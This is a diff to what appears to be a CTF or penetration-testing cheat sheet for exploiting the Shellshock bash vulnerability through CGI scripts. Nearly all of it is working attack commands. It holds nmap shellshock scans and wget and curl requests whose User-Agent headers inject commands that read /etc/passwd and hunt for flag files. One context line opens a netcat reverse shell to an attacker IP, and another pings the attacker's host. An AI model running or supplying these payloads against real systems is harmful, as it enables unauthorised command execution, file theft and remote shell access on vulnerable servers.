@@ -22,14 +22,16 @@ User-Agent = () { :;}; ping -c 5 -p "Test String" <Attacker IP Address>
 ./dirsearch.py -u http://<IP Address> -e cgi -r
 # Assume returns /cgi-bin/login.cgi
 
-nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi <IP Address> -p 80
+nmap -sV --script http-shellshock --script-args uri=/cgi-bin/login.cgi,cmd=id <Target Host> -p 80
+# In the event of 500 Internal Server Error.
+nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/login.cgi,cmd='echo Content-Type: text/html; echo; /usr/bin/id' <Target Host>
 ```
 
 ##### Attack Shellshock
 ```bash
 # Assuming dirsearch returns /cgi-bin/login.cgi
 
-wget -U "() { foo; }; echo \"Content-Type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://<IP Address>/cgi-bin/login.cgi && cat login.cgi
+wget -U "() { foo; }; echo \"Content-Type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://<Target Host>/cgi-bin/login.cgi && cat login.cgi
 # Makes HTTP request, setting User-Agent (-U) to the string.
 # It creates a local file, login.cgi, on the target, and cats the file.
 ```
@@ -40,6 +42,12 @@ wget -U "() { foo; }; echo \"Content-Type: text/plain\"; echo; echo; /bin/cat /e
 
 wget -U "() { foo; }; echo; /bin/nc <Attacker IP Address> <Listening Port> -e /bin/sh" http://<IP Address>/cgi-bin/login.cgi
 # Makes HTTP request, setting User-Agent (-U) to the string.
+```
+
+##### Search for Files
+```bash
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'find / -iname *flag* 2>/dev/null'" http://<Target Host>/cgi-bin/login.cgi
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /tmp/flag'" http://<Target Host>/cgi-bin/login.cgi
 ```
 
 ### Shellshock References
